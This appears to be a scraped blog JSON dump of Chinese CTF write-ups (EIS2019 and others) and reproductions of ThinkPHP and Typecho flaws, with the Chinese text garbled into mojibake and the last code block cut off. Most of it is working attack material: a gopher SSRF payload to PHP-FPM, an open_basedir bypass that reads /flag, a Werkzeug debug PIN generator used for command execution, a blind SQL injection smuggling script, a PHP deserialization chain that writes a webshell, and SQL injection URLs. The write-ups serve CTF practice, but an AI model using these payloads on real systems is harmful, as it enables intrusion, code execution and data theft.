ä¸­é—´èŠ±äº†å¥½å¤šæ—¶é—´ï¼Œä¸‹é¢è¿™ä¸ªæœ€é¦™ é“¾æ¥ï¼šhttps://evoa.me/index.php/archives/52/#toc-SSRFGopher 1python 2.py -c &quot;&lt;?php phpinfo();?&gt;&quot; 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 1gopher:&#x2F;&#x2F;10.0.0.3:9000&#x2F;_%01%01%5C%AF%00%08%00%00%00%01%00%00%00%00%00%00%01%04%5C%AF%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication&#x2F;text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT&#x2F;%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%01%04%5C%AF%00%00%00%00%01%05%5C%AF%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%5C%AF%00%00%00%00 å…ˆscandir(&#39;/&#39;) open_basedir()ä¸º /var/www/html,/tmpï¼Œè€ƒè™‘ç»•è¿‡ 1mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;); å†™çš„è„šæœ¬ä¸­åˆ«å¸¦åŒå¼•å·ï¼Œåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„ 1python 2.py -c &quot;&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;&quot; 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php flask_website å‚è€ƒé“¾æ¥ï¼š https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg usernameå°±æ˜¯å¯åŠ¨è¿™ä¸ªFlaskçš„ç”¨æˆ· ctf /etc/passwd modnameä¸ºflask.app getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))ä¸ºFlask getattr(mod, &#39;__file__&#39;, None)ä¸ºflaskç›®å½•ä¸‹çš„ä¸€ä¸ªapp.pyçš„ç»å¯¹è·¯å¾„ /usr/local/lib/python3.6/site-packages/flask/app.py uuid.getnode()å°±æ˜¯å½“å‰ç”µè„‘çš„MACåœ°å€ï¼Œ02:42:ac:16:00:02 /sys/class/net/eth0/address str(uuid.getnode())åˆ™æ˜¯macåœ°å€çš„åè¿›åˆ¶è¡¨è¾¾å¼ 2485378220034 get_machine_id() ï¼Œä¸å­˜åœ¨å°è¯•&quot;&quot;æˆ–è€…/proc/sys/kernel/random/boot_id å¾—åˆ°21e83dfd-206c-4e80-86be-e8d0afc467a1 æ­»æ´»ä¸è¡Œï¼Œé‚£ä¹ˆè‡ªå·±å¤ç°ä¸€ä¸‹ ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥å°±æ˜¯ä¸è¡Œ æœ€åè¿˜æ˜¯ç¿”å“¥ç«™äº†å‡ºæ¥ğŸ‘ ä¸€ç›´å¿½ç•¥äº†æœ€ä¸Šé¢çš„ä»£ç ï¼Œè·Ÿç€ç½‘ä¸Šçš„æ€è·¯èµ°ç¡®å®æ‰¾ä¸å‡ºé”™è¯¯ï¼Œå…¶å®è¿™ä¸ªå°±åœ¨æœ€å‰é¢ï¼Œæ€ç»´åƒµåŒ–è¯´çš„å°±æ˜¯æˆ‘ğŸ˜‘ è¿™é‡Œæ²¡æ”¹æºç  æ³¨æ„ç”±äºæ˜¯dockerç¯å¢ƒï¼Œæ¯éš”å‡ åˆ†é’Ÿé‡å¯ä¼šæ›´æ–°è¿™ä¸ªid 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits &#x3D; [ &#39;ctf&#39;, # username &#39;flask.app&#39;, # modname &#39;Flask&#39;, # getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits &#x3D; [ &#39;2485378220034&#39;,# str(uuid.getnode()), &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address &#39;8dfc43dfd42dfe01a275bef6a09482980d9f245058f769d9dfdfbd848e467241&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit &#x3D; bit.encode(&#39;utf-8&#39;) h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None: h.update(b&#39;pinsalt&#39;) num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size &#x3D;&#x3D; 0: rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;) for x in range(0, len(num), group_size)) break else: rv &#x3D; numprint(rv) PINç æ­£ç¡®åï¼Œosæ¨¡å—æ‰§è¡Œå‘½ä»¤ 12os.popen(&#39;ls &#x2F;&#39;).read()os.popen(&#39;cat &#x2F;t333333hisss_333111aaaggg.txt&#39;).read() åœ¨åšæŸäº›é¢˜ç›®çš„æ—¶å€™ï¼Œæ„Ÿè§‰è‡ªå·±æ€ç»´è¿˜æ˜¯å¤ªåƒµåŒ–äº†","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"EIS2019-wp","slug":"EIS2019-wp","date":"2019-11-21T01:15:01.000Z","updated":"2020-03-31T00:47:44.094Z","comments":true,"path":"2019/11/21/EIS2019-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/21/EIS2019-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ezbypass ezcms ezupload ezwaf ezpop ezjava ezbypass phpversion 7.2.19 èšå‰‘è¿ä¸Šå‘ç°å½“å‰ç›®å½•ä¸‹åªæœ‰index.php ç›´æ¥ä¸Šä¼ expåˆ°/tmpä¸‹ï¼Œå†include() expåœ°å€ï¼šhttps://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg ezcmsyzmCMS_V5.4æ¡†æ¶ï¼Œæœç´¢å†å²æ¼æ´ï¼Œæ‰¾åˆ°ä¸€ä¸ªeval()æ³¨å…¥æ¼æ´ï¼Œä½†æ˜¯å·²è¢«ä¿®å¤ è‡ªå·±æœ¬åœ°ä¸‹ä¸ªyzmCMS_V5.4æ¡†æ¶ï¼Œåˆ©ç”¨installæ—¶çš„è´¦å·åˆå§‹å¯†ç æˆåŠŸç™»å½•åå° å…ˆåœ¨å‰ç«¯é€›é€›ï¼Œçœ‹æœ‰æ²¡æœ‰æ˜æ˜¾åˆ©ç”¨ç‚¹ï¼ˆåæ­£ä¹‹å‰dedecmsæ˜¯æœ‰çš„ğŸ˜‚ï¼‰ æä¸åŠ¨ ezupload.login.php.bakæºç æ³„éœ² é€»è¾‘æ¼æ´ï¼Œåˆ é™¤passwordå‚æ•°å³å¯ç™»å½•ã€‚ æˆåŠŸç™»é™†åï¼Œæ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™åŠ ä¸ŠGIF89aç»•è¿‡æ ¼å¼ä»¥åŠå°è¯•ä¿®æ”¹åç¼€ä¸ºphtml ezwafå¾ˆæ˜æ˜¾ageå¤„æ—¶é—´ç›²æ³¨ï¼Œç»•è¿‡wafå‚è€ƒroarctfçš„httpèµ°ç§ ä¹‹å‰å†™äº†ä¸ªç”¨requestsçš„ä¸è¡Œï¼Œå¥½åƒæ˜¯å‘ä¸äº†ç•¸å½¢åŒ…ï¼Œç¿”å“¥è¯´å¯ä»¥ç”¨socketï¼Œè‡ªå·±å†™äº†ä¸ªæˆåŠŸäº† å†™ä¸ªè„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env python2# coding=utf-8import socketimport urllib2import timesocket.setdefaulttimeout(5)flag = \"\"tmp = 0easy_strings = [ord(i) for i in 'abcdefghijklmnopqrstuvwxyz_,']# print(easy_strings)for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # for j in easy_strings: # payload = \"select%20database()\" # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f786464)\" param = \"?age=-1%20or%20if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)\".format(payload, str(i), str(j)) param = 'POST /' + param + ' HTTP/1.1\\r\\n' print(param) try: sock = socket.socket() sock.connect(('111.186.57.123', 10601)) sock.send(param.encode()) sock.send('Host: 111.186.57.123:10601\\r\\n'.encode()) sock.send('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\\r\\n'.encode()) sock.send('Accept: */*\\r\\n'.encode()) sock.send('Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\r\\n'.encode()) sock.send('Accept-Encoding: gzip, deflate\\r\\n'.encode()) sock.send('Content-Length: 9\\r\\n'.encode()) sock.send('Content-Length: 9\\r\\n'.encode()) sock.send('\\r\\n'.encode()) sock.send('num=111\\r\\n'.encode()) # time.sleep(0.1) buf = sock.recv(1024) # while len(buf): # print buf # buf = s.recv(1024) except: flag += chr(j) tmp = 0 print(flag) breakprint(flag) ezpopè¿™é¢˜æŒºæœ‰æ„æ€çš„ æŠŠæ•´ä¸ªä»£ç è´´ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131&lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = 'flysystem', $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (! $this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B&#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options['prefix'] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options['serialize']; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool &#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // åˆ›å»ºå¤±è´¥ &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); &#125; $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125;&#125;if (isset($_GET['src']))&#123; highlight_file(__FILE__);&#125;$dir = \"uploads/\";if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[\"data\"]); å¤§è‡´çœ‹äº†çœ‹åˆ†æclass Aä¸­çš„$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);å¯ä»¥è°ƒç”¨class Bä¸­çš„set()æ–¹æ³•ï¼Œ æœ¬åœ°æµ‹è¯•ï¼Œå‘ç°å¤§è‡´å¦‚ä¸‹ éœ€è¦ç»•è¿‡exit();?&gt; ï¼Œå‚è€ƒä¹‹å‰moctfåšè¿‡çš„ä¸€é“é¢˜ï¼Œåˆ©ç”¨ 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x3D; æ€»ç»“ä¸‹POPé“¾ A-&gt;__destruct()-&gt;$this-&gt;save()-&gt;$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire) B-&gt;set() ç„¶åå°±æ˜¯ä¸€äº›å…·ä½“ç»†èŠ‚ 12345&lt;?php$data &#x3D; &#39;aaaPD9waHAgcGhwaW5mbygpOz8+&#39;;$exoire &#x3D; &quot;\\n&quot;;$data &#x3D; &quot;&lt;?php\\n&#x2F;&#x2F;&quot;.sprintf(&#39;%012d&#39;,$expire).&#39;&#39;.$data.&quot;\\n?&gt;&quot;;$result &#x3D; file_put_contents(&#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;6.php&#39;,$data); æœ¬åœ°ç›´æ¥æµ‹ï¼Œå‘ç°aaaçš„æ—¶å€™ è¿˜æœ‰ä¸ªå‘æ˜¯serialize()ï¼Œè·Ÿè¿›å‘ç°éœ€è¦æˆ‘ä»¬æ§åˆ¶ï¼Œä¿®æ”¹ä¸ºtrimå³å¯ ä¸æ”¹çš„è¯ä½¿ç”¨serializeåŠ 4ä¸ªaå³å¯ è¿˜æ›¾å¹»æƒ³è¿‡åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼Œè¢«å‚æ•°ç±»å‹ç»™åŠé€€äº† æœ€åæ„é€  12345678910111213141516171819202122&lt;?phpclass B&#123; public $options &#x3D; [&#39;serialize&#39;&#x3D;&gt;&#39;trim&#39;,&#39;prefix&#39;&#x3D;&gt;&#39;&#39;];&#125;class A&#123; protected $store; protected $key; protected $expire; public $cache &#x3D; array(&#39;aaaPD9waHAgcGhwaW5mbygpOz8+&#39;); public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123; $this-&gt;key &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;6.php&#39;; $this-&gt;store &#x3D; new B(); $this-&gt;expire &#x3D; $expire; &#125;&#125;$a &#x3D; new A(new B());echo urlencode(serialize($a)); æœ¬åœ°æµ‹è¯•æˆåŠŸğŸ‘Œ è¿˜æœ‰ä¸ªå°å‘ï¼Œæ³¨æ„ç›®å½•åˆ›å»ºçš„æ–‡ä»¶åº”è¯¥è¦å†/uploads/ä¸‹ï¼Œä¸ç„¶åˆ›å»ºä¸æˆåŠŸï¼Œåº”è¯¥æ˜¯è®¾ç½®äº†æƒé™ ezjavaç›´æ¥è§£å‹å³å¯ï¼Œ libæ–‡ä»¶å¤¹ä¸­å­˜åœ¨fastjson-1.2.47.jarï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°fastjson =&lt; 1.2.47 ååºåˆ—åŒ–æ¼æ´ å‘ç°classæ–‡ä»¶ï¼Œåˆ©ç”¨jd-guiåç¼–è¯‘ Index.class User.class ä»£ç ä¸éš¾ï¼Œæ ¹æ®é“¾æ¥å¤ç°å³å¯ å‚è€ƒé“¾æ¥ï¼šhttps://github.com/CaijiOrz/fastjson-1.2.47-RCE ç¬¬ä¸€æ­¥ç®€å•æ£€æµ‹ centos7å®‰è£…jdk8 12yum install java-1.8.0-openjdkyum install java-1.8.0-openjdk-devel.x86_64 ç„¶åè·Ÿç€æ•™ç¨‹èµ°å°±è¡Œ","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"ThinkPHP 3.X/5.X order byæ³¨å…¥æ¼æ´","slug":"ThinkPHP-3-X-5-X-order-byæ³¨å…¥æ¼æ´","date":"2019-11-18T01:40:11.000Z","updated":"2020-03-29T15:05:12.306Z","comments":true,"path":"2019/11/18/ThinkPHP-3-X-5-X-order-byæ³¨å…¥æ¼æ´/","link":"","permalink":"https://glotozz.github.io/2019/11/18/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ å‚è€ƒé“¾æ¥ ä¹‹å‰çº¢å¸½æ¯çš„xyhcmsåˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªæ¼æ´ï¼Œä¸»è¦è¿˜æ˜¯è‡ªå·±å¯¹è¿™äº›å†å²æ¼æ´ä¸å¤Ÿç†Ÿæ‚‰ï¼Œå­¦ï¼ è¯¥æ¼æ´å½±å“ThinkPHP 3.2.3ã€5.1.22åŠä»¥ä¸‹ç‰ˆæœ¬ã€‚ ä¸€ã€è·å–æ¼æ´ThinkPHP3.2.3 å®˜ç½‘ä¸‹è½½ï¼š http://www.thinkphp.cn/donate/download/id/610.html ä¿®æ”¹Application/Home/Controller/IndexController.class.php 123456789101112&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller &#123; public function index()&#123; $data &#x3D; array(); $data[&#39;username&#39;] &#x3D; array(&#39;eq&#39;,&#39;admin&#39;); $order &#x3D; I(&#39;get.order&#39;); $m &#x3D; M(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find(); dump($m); &#125;&#125; Application/Home/Conf/config.php 123456789101112&lt;?phpreturn array( &#x2F;&#x2F;&#39;é…ç½®é¡¹&#39;&#x3D;&gt;&#39;é…ç½®å€¼&#39; &#x2F;&#x2F;è¿æ¥æ•°æ®åº“ &#39;DB_TYPE&#39; &#x3D;&gt; &#39;mysql&#39;,&#x2F;&#x2F;æ•°æ®ç±»å‹ &#39;DB_HOST&#39; &#x3D;&gt; &#39;localhost&#39;,&#x2F;&#x2F;æœåŠ¡å™¨ &#39;DB_NAME&#39; &#x3D;&gt; &#39;think_login&#39;,&#x2F;&#x2F;æ•°æ®åº“å &#39;DB_USER&#39; &#x3D;&gt; &#39;root&#39;,&#x2F;&#x2F;è¿æ¥æ•°æ®åº“ç”¨æˆ·å &#39;DB_PWD&#39; &#x3D;&gt; &#39;root&#39;,&#x2F;&#x2F;å¯†ç  &#39;DB_PREFIX&#39; &#x3D;&gt; &#39;think_&#39;,&#x2F;&#x2F;è¡¨å‰ç¼€ &#39;DB_CHARSET&#39; &#x3D;&gt; &#39;utf8&#39;,&#x2F;&#x2F;ç¼–ç ); äºŒã€æ¼æ´å®ç°1http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_3.2.3_full&#x2F;?order[updatexml(1,concat(0x3a,user()),1)]&#x3D; ä¸‰ã€æ¼æ´åˆ†æ ThinkPHPåœ¨å¤„ç†order byæ’åºæ—¶ï¼Œå½“æ’åºå‚æ•°å¯æ§ä¸”ä¸ºå…³è”æ•°ç»„(key-value)æ—¶ï¼Œç”±äºæ¡†æ¶æœªå¯¹æ•°ç»„ä¸­keyå€¼ä½œå®‰å…¨è¿‡æ»¤å¤„ç†ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨keyæ„é€ SQLè¯­å¥è¿›è¡Œæ³¨å…¥ï¼Œè¯¥æ¼æ´å½±å“ThinkPHP 3.2.3ã€5.1.22åŠä»¥ä¸‹ç‰ˆæœ¬ã€‚ ThinkPHP/Library/Think/Db/Driver.class.php è¿½è¸ªparseKey() è¿‡æ»¤å¯¹paylaodæ²¡æœ‰å½±å“ï¼Œå†è¿½è¸ªI() ä¹Ÿæ²¡æœ‰è¿‡æ»¤ã€‚ã€‚é‚£ä¹ˆæœ€åè°ƒè¯•ä¸€ä¸‹ ================================= ä¸€ã€è·å–æ¼æ´TP5.1.22 application/index/controller/Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller &#123; public function index()&#123; $data &#x3D; array(); $data[&#39;username&#39;] &#x3D; array(&#39;eq&#39;,&#39;admin&#39;); $order &#x3D; input(&#39;get.order&#39;); $m &#x3D; db(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find(); dump($m); &#125;&#125; è¿™é‡Œéœ€è¦æŠŠphpç‰ˆæœ¬åˆ‡åˆ°5.6åŠä»¥ä¸Š æ§åˆ¶å™¨çš„å®šä¹‰è¯­å¥ç•¥æœ‰ä¸åŒï¼Œå…·ä½“å‚è€ƒå¼€å‘æ‰‹å†Œï¼Œå¾ˆé¦™ https://www.kancloud.cn/manual/thinkphp5_1/353979 äºŒã€æ¼æ´å®ç°1http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5.1.22&#x2F;public&#x2F;index.php&#x2F;Index&#x2F;index?order[username&#96;|updatexml(1,concat(0x3a,user()),1)%23]&#x3D;1 ä¸‰ã€æ¼æ´åˆ†æthinkphp/library/think/db/Query.php å°†ä¼ å…¥çš„fieldæ•°ç»„ç›´æ¥array_merge()åˆ°$this-&gt;options[&#39;order&#39;] è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ thinkphp/library/think/db/Builder.phpä¸­çš„parseOrder()å‡½æ•° è·Ÿè¸ªæœ€åçš„sqlè¯­å¥ 1SELECT * FROM &#96;think_user&#96; WHERE &#96;username&#96; IN (:where_AND_username_in_1,:where_AND_username_in_2) ORDER BY &#96;username&#96;|updatexml(1,concat(0x3a,user()),1)#&#96; LIMIT 1 å…¶ä¸­:where_AND_username_in_1,:where_AND_username_in_2ä¼šé€šè¿‡å‚æ•°ç»‘å®šçš„å½¢å¼ä¼ å…¥ 1SELECT * FROM &#96;think_user&#96; WHERE &#96;username&#96; IN (&#39;eq&#39;,&#39;admin&#39;) ORDER BY &#96;username&#96;|updatexml(1,concat(0x3a,user()),1)#&#96; LIMIT 1 æ³¨æ„è¿™é‡Œçš„|æ“ä½œç¬¦ å‚è€ƒé“¾æ¥https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Typecho-ååºåˆ—åŒ–æ¼æ´åˆ†æ","slug":"Typecho-ååºåˆ—åŒ–æ¼æ´åˆ†æ","date":"2019-11-18T00:56:15.000Z","updated":"2020-03-28T01:07:03.091Z","comments":true,"path":"2019/11/18/Typecho-ååºåˆ—åŒ–æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2019/11/18/Typecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• 1ã€è·å–æ¼æ´ 2ã€æ¼æ´å®ç° 3ã€æ¼æ´åˆ†æ å‚è€ƒé“¾æ¥ é€›åˆ°ä¸€ç¯‡Typecho-ååºåˆ—åŒ–æ¼æ´ï¼Œæ„Ÿè§‰æ¯”è¾ƒæœ‰æ„æ€ï¼Œé‚æ¥å¤ç°ä¸€ä¸‹ 1ã€è·å–æ¼æ´ v1.0ç‰ˆæœ¬ 1git clone https:&#x2F;&#x2F;github.com&#x2F;typecho&#x2F;typecho.git --branch v1.0-14.10.10-release 2ã€æ¼æ´å®ç°å‚è€ƒæ¼æ´åˆ†ææœ€åçš„æ¼æ´å®ç° 3ã€æ¼æ´åˆ†ææ¼æ´çš„å…¥å£ç‚¹åœ¨install.php è¿™é‡Œåªéœ€è¦ä¼ ä¸ªfinishï¼Œå†æŠŠrefereræ”¹æˆç«™å†…urlå³å¯ ç„¶åå°±æ˜¯ååºåˆ—åŒ–è§¦å‘ç‚¹ è¿™é‡Œå¦‚æœæ„é€ çš„ååºåˆ—åŒ–æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­adapterè®¾ç½®ä¸ºæŸä¸ªç±»ï¼Œå°±å¯ä»¥è§¦å‘ç›¸åº”ç±»çš„__toStringæ–¹æ³• é‚£ä¹ˆç»§ç»­å¯»æ‰¾å¯ç”¨çš„__toString() var/Typecho/Feed.php $itemæ˜¯ä¸€ä¸ªç§æœ‰å˜é‡æ•°ç»„ï¼Œå»è°ƒç”¨screenNameå˜é‡ï¼Œè¿™é‡Œå¯ä»¥è§¦å‘__get() __getä¼šåœ¨è¯»å–ä¸å¯è®¿é—®çš„å±æ€§çš„å€¼çš„æ—¶å€™è°ƒç”¨ é‚£ä¹ˆå¯»æ‰¾å¯ç”¨çš„__get() var/Typecho/Request.php è¿½è¸ªget()æ–¹æ³• è¿½è¸ª_applyFilter() call_user_func()å¯å‘½ä»¤æ‰§è¡Œç­‰ æ€»ç»“ä¸€ä¸‹POPé“¾ var/Typecho/Feed.php-&gt;__toString()-&gt;$item[&#39;author&#39;]-&gt;screenName var/Typecho/Request.php-&gt;__get()-&gt;get()-&gt;_applyFilter-&gt;call_user_func() é‚£ä¹ˆå°è¯•æ„é€ payload ä½†æ˜¯å‘ç°500é”™è¯¯å¯¼è‡´æ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯è°ƒè¯•æ˜æ˜æ²¡é—®é¢˜=ã€‚= åœ¨install.phpçš„å¼€å§‹ï¼Œè°ƒç”¨äº†ob_start() å› ä¸ºæˆ‘ä»¬ä¸Šé¢å¯¹è±¡æ³¨å…¥çš„ä»£ç è§¦å‘äº†åŸæœ¬çš„exceptionï¼Œå¯¼è‡´ob_end_clean()æ‰§è¡Œï¼ŒåŸæœ¬çš„è¾“å‡ºä¼šåœ¨ç¼“å†²åŒºè¢«æ¸…ç†ã€‚ æˆ‘ä»¬å¯ä»¥å°†ç¨‹åºæå‰exitï¼Œä¸ç»è¿‡åé¢çš„æŠ¥é”™å³å¯ã€‚ è¿™é‡Œæœ‰ä¸¤ä¸ªåŠæ³•ã€‚ 1ã€å› ä¸ºcall_user_funcå‡½æ•°å¤„æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®æ•°ç»„æ¥æ§åˆ¶ç¬¬äºŒæ¬¡æ‰§è¡Œçš„å‡½æ•°ï¼Œç„¶åæ‰¾ä¸€å¤„exitè·³å‡ºï¼Œç¼“å†²åŒºä¸­çš„æ•°æ®å°±ä¼šè¢«è¾“å‡ºå‡ºæ¥ã€‚ 2ã€ç¬¬äºŒä¸ªåŠæ³•å°±æ˜¯åœ¨å‘½ä»¤æ‰§è¡Œä¹‹åï¼Œæƒ³åŠæ³•é€ æˆä¸€ä¸ªæŠ¥é”™ï¼Œè¯­å¥æŠ¥é”™å°±ä¼šå¼ºåˆ¶åœæ­¢ï¼Œè¿™æ ·ç¼“å†²åŒºä¸­çš„æ•°æ®ä»ç„¶ä¼šè¢«è¾“å‡ºå‡ºæ¥ã€‚ è¿™é‡Œvalueè¢«é™åˆ¶äº†ä¸èƒ½ä¸ºæ•°ç»„ï¼Œæ‰€ä»¥è€ƒè™‘è®¾ç½®filterä¸ºæ•°ç»„ï¼Œä½†æ˜¯è¿™æ ·æ¯”è¾ƒéº»çƒ¦ï¼Œæ‰€ä»¥å‚è€ƒé“¾æ¥å¢åŠ å¦‚ä¸‹$item[&#39;category&#39;] = array(new Typecho_Request()); å½“ç„¶å†™å…¥æ–‡ä»¶ï¼Œåå¼¹shellç­‰æ— å›æ˜¾çš„ä¹Ÿå¯ 123456789101112131415161718192021222324252627&lt;?php class Typecho_Feed&#123; private $_items &#x3D; array(); const RSS2 &#x3D; &#39;RSS 2.0&#39;; private $_type; public function 